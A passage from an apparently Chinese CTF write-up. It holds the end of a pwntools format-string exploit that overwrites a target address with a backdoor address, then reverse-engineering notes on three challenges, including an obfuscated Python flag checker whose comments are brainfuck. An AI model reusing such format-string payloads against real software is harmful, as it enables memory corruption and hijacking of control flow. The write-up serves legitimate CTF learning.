class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg4) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c5) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg5) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c6) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg6) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = payload + p64(target)</span><br><span class="line">payload = payload + p64(target + <span class="number">0x1</span>)</span><br><span class="line">payload = payload + p64(target + <span class="number">0x2</span>)</span><br><span class="line">payload = payload + p64(target + <span class="number">0x3</span>)</span><br><span class="line">payload = payload + p64(target + <span class="number">0x4</span>)</span><br><span class="line">payload = payload + p64(target + <span class="number">0x5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    backdoor = <span class="number">0x40129D</span></span><br><span class="line">    dbg()</span><br><span class="line">    payload = format_string_template_64(<span class="number">6</span>, <span class="number">0x404060</span>, backdoor, <span class="number">0</span>, <span class="number">0x50</span>, <span class="number">3</span>)</span><br><span class="line">    ru(<span class="string">&#x27; &gt;&gt;&#x27;</span>)</span><br><span class="line">    sl(payload)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Coffee-Shop"><a href="#Coffee-Shop" class="headerlink" title="Coffee Shop"></a>Coffee Shop</h2><p>jadx一拖就出来了，简单的base64</p><p><img src="https://s2.loli.net/2023/09/11/aM9xRubKt2vS1Qi.png" alt=""></p><h2 id="Patchwork"><a href="#Patchwork" class="headerlink" title="Patchwork"></a>Patchwork</h2><p>题目说程序的执行流有问题</p><p>懒得逆向，直接在gdb里跳转到目标函数（</p><p><img src="https://s2.loli.net/2023/09/11/oExOLZqhjVRzYdQ.png" alt=""></p><p><img src="https://s2.loli.net/2023/09/11/tmTYgnH24Swvza7.png" alt=""></p><h2 id="garbage"><a href="#garbage" class="headerlink" title="garbage"></a>garbage</h2><p>给了源代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++.++++.+++.-.+++.++.&lt;&lt;++.&gt;&gt;-.+.--.---------.+++++.-------.</span></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> * <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.++++++++++++.---.--.&lt;&lt;++.&gt;&gt;+++++.-----------------.+++++++++++++.----------.+++++++++++.--.&lt;&lt;.&gt;&gt;----.++++.+++.-.+++.++.&lt;&lt;.++++++++++.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finalstage</span>(<span class="params">w</span>):</span> <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;.+.+.&lt;&lt;++.&gt;&gt;.+++.+++++.-------------.+++++++++++.+++++++.+.-------------------.++++++.--.&lt;&lt;++++++++.&gt;&gt;++++++++++++++++++.&lt;&lt;+.&gt;------------.</span></span><br><span class="line">    h=<span class="number">0</span> <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++.&lt;---------.-------------.</span></span><br><span class="line">    w = <span class="built_in">list</span>(w) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++++++++++++++++.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;-----------.---.++++++++++.+.&lt;&lt;++++++++.&gt;&gt;+++.&lt;&lt;+.</span></span><br><span class="line">    w.reverse() <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++++++++++++++++.&lt;&lt;++++++++++++++++.&gt;&gt;-----.-------------.+++++++++++++++++.-----------------.+++++++++++++.+.--------------.&lt;&lt;------.+.</span></span><br><span class="line">    w = <span class="string">&quot;&quot;</span>.join(g <span class="keyword">for</span> g <span class="keyword">in</span> w) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++++++++++++++++.&lt;&lt;++.&gt;---------.&lt;.++..++++++++++++.&gt;&gt;-------------.+++++.------.+++++.&lt;&lt;------.&gt;&gt;-------.&lt;&lt;--------.&gt;&gt;-.+++++++++.+++.&lt;&lt;.&gt;&gt;-----------.&lt;&lt;.&gt;&gt;++.+++++.&lt;&lt;.&gt;&gt;+++++++++.&lt;&lt;+++++++++.</span></span><br><span class="line">    flag = <span class="string">&#x27;flag&#x27;</span>.replace(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;galf&#x27;</span>).replace(<span class="string">&#x27;galf&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.++++++.-----------.++++++.&lt;&lt;++.&gt;---------.&lt;.+++++++.&gt;&gt;-.++++++.-----------.++++++.&lt;&lt;.+++++++.&gt;&gt;+++++++++++.-------------.+++++++++++.----.-----------.++.++.&lt;&lt;------.-.&gt;&gt;+.++++++.-----------.++++++.&lt;&lt;.+++++.------------.+++++++.&gt;&gt;.------.+++++++++++.------.&lt;&lt;.++.+++++.&gt;&gt;++++++++++++.-------------.+++++++++++.----.-----------.++.++.&lt;&lt;------.-.&gt;&gt;++.------.+++++++++++.------.&lt;&lt;.+++++.------------.+++++++..++.</span></span><br><span class="line">    <span class="keyword">while</span> h &lt; <span class="built_in">len</span>(w): <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++++++++++++++++.---------------.+.+++.-------.&lt;&lt;++.&gt;&gt;+++.&lt;&lt;.&gt;----------.&lt;.&gt;&gt;++++.-------.+++++++++.&lt;&lt;++++++++.&gt;&gt;+++++++++.&lt;&lt;+.&gt;--.</span></span><br><span class="line">        <span class="keyword">try</span>: <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++++++.--.+++++++.&lt;------------.</span></span><br><span class="line">            flag += w[h+<span class="number">1</span>] + w[h] <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.++++++.-----------.++++++.&lt;&lt;++.+++++++++++.&gt;---------.&lt;-----------.&gt;&gt;++++++++++++++++.----------------------------.+++++++++++++.&lt;&lt;+++++++++++.++++++.&gt;&gt;-----------.&lt;&lt;-----------------.+++++++++++.-----------.&gt;&gt;++++++++++++++++++++++++++.----------------------------.+++++++++++++.-----------.</span></span><br><span class="line">        <span class="keyword">except</span>: <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+.+++++++++++++++++++.---------------------.++.+++++++++++.++++.&lt;------------.</span></span><br><span class="line">            flag += w[h] <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.++++++.-----------.++++++.&lt;&lt;++.+++++++++++.&gt;---------.&lt;-----------.&gt;&gt;++++++++++++++++.----------------------------.+++++++++++++.-----------.</span></span><br><span class="line">        h+=<span class="number">2</span> <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++.&lt;&lt;+++++++++++++.&gt;---------.&lt;+++++++.</span></span><br><span class="line">    print(<span class="string">&quot;Final Stage complete&quot;</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++.++.---------.+++++.++++++.&lt;&lt;++++++++++.------.&gt;.&gt;-----------.+++++.-------------.+++++++++++.&lt;&lt;--.&gt;+++++++++++++.&gt;++++++++.&lt;++++++++++++++.++++++.--.&lt;.&gt;--.&gt;-----.--.+++.----.&lt;++.&gt;++++++++.&lt;.&lt;++.+++++++.</span></span><br><span class="line">    <span class="keyword">return</span> flag <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++++.-------------.+++++++++++++++.+.---.----.&lt;&lt;++.&gt;&gt;--------.++++++.-----------.++++++.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage2</span>(<span class="params">b</span>):</span> <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;.+.+.&lt;&lt;++.&gt;&gt;+++++++++++++.+.-------------------.++++++.--.&lt;&lt;++++++++++++++++++.----------.&gt;&gt;---.&lt;&lt;+.&gt;------------.</span></span><br><span class="line">    t = <span class="string">&quot;++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.++++++.-----------.++++++.&quot;</span>[-<span class="number">15</span>:(<span class="number">7</span>*<span class="number">9</span>)].strip(<span class="string">&#x27;-&#x27;</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++++++.&lt;&lt;++.&gt;---------.&lt;.++.+++++++++..........&gt;&gt;-------------------------.&lt;+.&lt;.&gt;.&lt;...&gt;.&lt;.......&gt;.&lt;..........&gt;--....&lt;++.&gt;&gt;++.&lt;++....&lt;--..+++.---......+++.-...........+.---......+++.------------.&gt;&gt;--.&lt;&lt;+++++++++++.++++.++++.&gt;----.&lt;-------------.&gt;---.&lt;++.&gt;++.&lt;-.&gt;&gt;++.&lt;&lt;+++++.&gt;&gt;++++++++++++++++++++++.+.--.---------.+++++++.&lt;&lt;------.-.++++++.------.++.</span></span><br><span class="line">    <span class="keyword">for</span> q <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)): <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.+++++++++.+++.&lt;&lt;++.&gt;&gt;-.&lt;&lt;.&gt;&gt;--------.+++++.&lt;&lt;.&gt;&gt;++++.-----------------.+++++++++++++.-------.--.&lt;&lt;++++++++.&gt;&gt;+++++++.-------.+++++++++.&lt;&lt;.&gt;&gt;------------.&lt;&lt;+..&gt;------------.</span></span><br><span class="line">        t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(b[q]) - randint(<span class="number">0</span>,<span class="number">5</span>)) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++++++.&lt;&lt;++.+++++++++++.&gt;---------.&lt;-----------.&gt;&gt;-----------------.+++++.++++++++++.&lt;&lt;++++++++.&gt;&gt;---.+++.--------------.&lt;&lt;.&gt;&gt;--.-------.++++++++++++++++++++++.--------------------.&lt;&lt;+.++++.&gt;&gt;+++++++++++++++++++++.-----------------.+++++++++++++.----------.+++++.+++++.++++++.&lt;&lt;-----.++++++++.----.&gt;--------.&lt;---..</span></span><br><span class="line">    print(<span class="string">&quot;Stage 2 complete&quot;</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++.++.---------.+++++.++++++.&lt;&lt;++++++++++.------.&gt;+++++++++++++.&gt;.&lt;++++++++++++++.++++++.--.&lt;--.++++++++++++++++++.------------------.&gt;--.&gt;-----.--.+++.----.&lt;++.&gt;++++++++.&lt;.&lt;++.+++++++.</span></span><br><span class="line">    flag = finalstage(t) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.++++++.-----------.++++++.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;-.+++.+++++.-------------.+++++++++++.+++++++.+.-------------------.++++++.--.&lt;&lt;++++++++.&gt;&gt;+++++++++++++++.&lt;&lt;+.</span></span><br><span class="line">    <span class="keyword">return</span> flag <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++++.-------------.+++++++++++++++.+.---.----.&lt;&lt;++.&gt;&gt;--------.++++++.-----------.++++++.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage1</span>(<span class="params">a</span>):</span> <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;.+.+.&lt;&lt;++.&gt;&gt;+++++++++++++.+.-------------------.++++++.--.&lt;&lt;+++++++++++++++++.---------.&gt;&gt;----.&lt;&lt;+.&gt;------------.</span></span><br><span class="line">    a = <span class="built_in">list</span>(a) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;---.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;+++++++++++.---.++++++++++.+.&lt;&lt;++++++++.&gt;&gt;-------------------.&lt;&lt;+.</span></span><br><span class="line">    b = <span class="built_in">list</span>(string.ascii_lowercase) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;--.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;++++++++++.---.++++++++++.+.&lt;&lt;++++++++.&gt;&gt;-.+.--.---------.+++++.-------.&lt;&lt;++++++.&gt;&gt;------.++++++++++++++++++.----------------.++++++..----------.+++++++++++++.+++.++++++++.------------------.+++++++++++++.---------------.--.++++++++++++++++++.--------------.&lt;&lt;-----.</span></span><br><span class="line">    <span class="keyword">for</span> o <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)): <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.+++++++++.+++.&lt;&lt;++.&gt;&gt;---.&lt;&lt;.&gt;&gt;------.+++++.&lt;&lt;.&gt;&gt;++++.-----------------.+++++++++++++.-------.--.&lt;&lt;++++++++.&gt;&gt;+++++++.-------.+++++++++.&lt;&lt;.&gt;&gt;-------------.&lt;&lt;+..&gt;------------.</span></span><br><span class="line">        a[o] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(a[o])^o) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;---.------.++++++++++++++++++++.------------------.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;++++++.+++++.++++++++++.&lt;&lt;++++++++.&gt;&gt;---.+++.--------------.&lt;&lt;.&gt;&gt;---.------.++++++++++++++++++++.------------------.&lt;&lt;+.&gt;&gt;+.+++++++++++++++++.&lt;&lt;</span></span><br><span class="line">    z = <span class="string">&quot;&quot;</span>.join(x <span class="keyword">for</span> x <span class="keyword">in</span> a) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++++++++++++.&lt;&lt;++.&gt;---------.&lt;.++..++++++++++++.&gt;&gt;----------------.+++++.------.+++++.&lt;&lt;------.&gt;&gt;++++++++++.&lt;&lt;--------.&gt;&gt;------------------.+++++++++.+++.&lt;&lt;.&gt;&gt;++++++.&lt;&lt;.&gt;&gt;---------------.+++++.&lt;&lt;.&gt;&gt;-------------.&lt;&lt;+++++++++.</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(z)): <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.+++++++++.+++.&lt;&lt;++.&gt;&gt;+++++++.&lt;&lt;.&gt;&gt;----------------.+++++.&lt;&lt;.&gt;&gt;++++.-----------------.+++++++++++++.-------.--.&lt;&lt;++++++++.&gt;&gt;+++++++.-------.+++++++++.&lt;&lt;.&gt;&gt;++++++++++++.&lt;&lt;+..&gt;------------.</span></span><br><span class="line">        b[y%<span class="built_in">len</span>(b)] = <span class="built_in">chr</span>((  <span class="built_in">ord</span>(z[y]) ^ <span class="built_in">ord</span>(a[y]) ) + <span class="built_in">len</span>(b)  ) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;--.-------.++++++++++++++++++++++++++++++.&lt;&lt;+++++++.&gt;&gt;-------------.-------.+++++++++.&lt;&lt;+++.&gt;&gt;------------.&lt;&lt;+.&gt;&gt;-----.&lt;&lt;---------.&gt;---------.&lt;.&gt;&gt;++++++.+++++.++++++++++.&lt;&lt;++++++++..&gt;&gt;---.+++.--------------.&lt;&lt;.&gt;&gt;++++++++++++++++++++++.&lt;++++++++++++++++++++++++++++++.&gt;-.&lt;++.&lt;+.&gt;+.&gt;----------.+++.&lt;++++++.&lt;-.&gt;---.------.&gt;+++++++.&lt;++.&lt;+..++.&gt;&gt;-------------.-------.+++++++++.&lt;&lt;---.&gt;+++++.&lt;+..</span></span><br><span class="line">    print(<span class="string">&quot;Stage 1 complete&quot;</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++.++.---------.+++++.++++++.&lt;&lt;++++++++++.------.&gt;+++++++++++++.&gt;.&lt;++++++++++++++.++++++.--.&lt;--.+++++++++++++++++.-----------------.&gt;--.&gt;-----.--.+++.----.&lt;++.&gt;++++++++.&lt;.&lt;++.+++++++.</span></span><br><span class="line">    flag = stage2(z) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.++++++.-----------.++++++.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;++++++++++++.+.-------------------.++++++.--.&lt;-----------.&lt;++++++++.&gt;&gt;+++++++++++++++++++++.&lt;&lt;+.</span></span><br><span class="line">    <span class="keyword">return</span> flag <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++++.-------------.+++++++++++++++.+.---.----.&lt;&lt;++.&gt;&gt;--------.++++++.-----------.++++++.</span></span><br><span class="line"><span class="comment"># QBPKxH.u&quot;F1fRy3U[bM36j]QvS=03*]o0feA|</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry</span>(<span class="params">f</span>):</span> <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;.+.+.&lt;&lt;++.&gt;&gt;-.+++++++++.++++++.--.+++++++.&lt;&lt;++++++++.&gt;&gt;-------------------.&lt;&lt;+.&gt;------------.</span></span><br><span class="line">    seed(<span class="number">10</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++++++++++++.--------------..-.&lt;&lt;++++++++++.+++++++++.-.-------.</span></span><br><span class="line">    f = <span class="built_in">list</span>(f) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;++++++.---.++++++++++.+.&lt;&lt;++++++++.&gt;&gt;--------------.&lt;&lt;+.</span></span><br><span class="line">    f.reverse() <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.&lt;&lt;++++++++++++++++.&gt;&gt;++++++++++++.-------------.+++++++++++++++++.-----------------.+++++++++++++.+.--------------.&lt;&lt;------.+.</span></span><br><span class="line">    f = <span class="string">&quot;&quot;</span>.join(i <span class="keyword">for</span> i <span class="keyword">in</span> f) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.&lt;&lt;++.&gt;---------.&lt;.++..++++++++++++.&gt;&gt;++++.+++++.------.+++++.&lt;&lt;------.&gt;&gt;-----.&lt;&lt;--------.&gt;&gt;---.+++++++++.+++.&lt;&lt;.&gt;&gt;---------.&lt;&lt;.&gt;&gt;.+++++.&lt;&lt;.&gt;&gt;--------.&lt;&lt;+++++++++.</span></span><br><span class="line">    print(<span class="string">&quot;Entry complete&quot;</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++.++.---------.+++++.++++++.&lt;&lt;++++++++++.------.&gt;-.&gt;------.++++++.--.+++++++.&lt;&lt;--.&gt;&gt;----------------------.++++++++++++.--.+++.----.-------.+++++++++++++++.---------------.&lt;&lt;++.+++++++.</span></span><br><span class="line">    flag = stage1(f) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.++++++.-----------.++++++.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;++++++++++++.+.-------------------.++++++.--.&lt;------------.&lt;++++++++.&gt;&gt;+.&lt;&lt;+.</span></span><br><span class="line">    <span class="keyword">return</span> flag <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++++.-------------.+++++++++++++++.+.---.----.&lt;&lt;++.&gt;&gt;--------.++++++.-----------.++++++.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:<span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++.---.&lt;&lt;++.&gt;&gt;-------..+++++++++++++++.-------------.++++++++++++.--------.------..&lt;&lt;.&gt;---------..&lt;.+++++++.&gt;&gt;..++++++++++++++.------------.++++++++.+++++.---------------..&lt;&lt;.&gt;---.</span></span><br><span class="line">    <span class="comment"># input = entry(input(&quot;Enter Flag: &quot;)) # ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++.+++++.++.+++++.-.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;---------------.+++++++++.++++++.--.+++++++.&lt;&lt;++++++++.&gt;&gt;----------------.+++++.++.+++++.-.&lt;&lt;.------.&gt;++++++++.&gt;------.++++++.---------------.+++++++++++++.&lt;&lt;--.&gt;+.&gt;------.-----------.++++++.&lt;------------.&lt;.++.+++++++..</span></span><br><span class="line">    <span class="built_in">input</span> = entry(<span class="string">&#x27;QBPKxH.u&quot;F1fRy3U[bM36j]QvS=03*]o0feA|&#x27;</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++.+++++.++.+++++.-.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;---------------.+++++++++.++++++.--.+++++++.&lt;&lt;++++++++.&gt;&gt;----------------.+++++.++.+++++.-.&lt;&lt;.------.&gt;++++++++.&gt;------.++++++.---------------.+++++++++++++.&lt;&lt;--.&gt;+.&gt;------.-----------.++++++.&lt;------------.&lt;.++.+++++++..</span></span><br><span class="line">    flag = <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()[<span class="number">0</span>] <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.++++++.-----------.++++++.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;++++++++.+.-----------.+++++++++.&lt;&lt;++++++++.-.&gt;&gt;+.++++++.-.----.+++++.-.&lt;&lt;+++++++.&gt;&gt;.++++.----.&lt;&lt;-------.+++++.------------.+++++++.&gt;&gt;--.&lt;&lt;.++.+++++.&gt;&gt;.-------------.----.+++.++++++++.---.+++++.---------.++++++++++++++.&lt;&lt;------.+.&gt;&gt;------------------------.&lt;&lt;+++++++.&gt;&gt;++.</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">input</span> == flag: <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++.---.&lt;&lt;++.&gt;&gt;+++.+++++.++.+++++.-.&lt;&lt;.&gt;---------..&lt;.&gt;&gt;--------------.++++++.-----------.++++++.&lt;---.</span></span><br><span class="line">        print(<span class="string">&quot;What... how?&quot;</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++.++.---------.+++++.++++++.&lt;&lt;++++++++++.------.&gt;+++++++++++++++++.&gt;------------.-------.+++++++++++++++++++.&lt;&lt;++++++++++++...--------------.&gt;&gt;------------.+++++++.++++++++.&lt;------------------------.&lt;++.+++++++.</span></span><br><span class="line">        print(<span class="string">&quot;I guess you broke my &#x27;beautiful&#x27; code :(&quot;</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++.++.---------.+++++.++++++.&lt;&lt;++++++++++.------.&gt;+++.&lt;--.&gt;&gt;-------------.++++++++++++++.----------------.++++++++++++++..&lt;&lt;.&gt;&gt;++++++.----------.++++++.&lt;&lt;.&gt;&gt;-------------------.++++++++++++++++.---.----.------.&lt;&lt;.&gt;&gt;++++++++.++++++++++++.&lt;&lt;.+++++++.&gt;&gt;-----------------------.+++.----.++++++++++++++++++++.-.-----------.---.+++++++++++++++.---------.&lt;&lt;.-------.&gt;&gt;---------.++++++++++++.-----------.+.&lt;&lt;.&gt;---------------.&lt;++++++++.------.+++++++.</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+.+++++++.+++++++.--------------.&lt;------------.</span></span><br><span class="line">        print(<span class="string">&quot;haha, nope. Try again!&quot;</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++.++.---------.+++++.++++++.&lt;&lt;++++++++++.------.&gt;&gt;------------.-------.+++++++.-------.&lt;&lt;++++++++++.------------.&gt;&gt;+++++++++++++.+.+.-----------.&lt;&lt;++++++++++++++.--------------.&gt;++++++++++++++.&gt;+++++++++++++.+++++++.&lt;&lt;.&gt;+++++++++++++.++++++.------.++++++++.+++++.&lt;+.+.+++++++.</span></span><br></pre></td></tr></table></figure><p>注释是源代码的brainfuck编码，我一开始还以为源代码是假的，brainfuck解码出来才是真的，没想到真一模一样（</p><p>代码的流程为，flag先进入entry函数，然后倒序，进入stage1</p><p>stage1的流程为，每个位置上的字符与其序号进行一次异或，然后传入stage2</p><p>stage2的流程为，新建一个空变量t（那串brainfuck是混淆代码，其实就是空字符串），然后传入的flag每个都进行了一次减法，此处随机数为伪随机，完全可复现，然后传入finalstage</p><p>finalstage的流程为，将flag逆序一次，然后两两一组将flag调换一下，由于flag为奇数，故最后一个flag的字符不变</p><p>很简单，只要照着流程逆序即可：</p><p><code>result两两调换 -&gt; 逆序 -&gt; 按照随机数加一个值 -&gt; 与自己位置上的字符进行异或 -&gt; 逆序</code></p><p>解密脚本如下：</p><figure class="highlight python"><table><tr><td 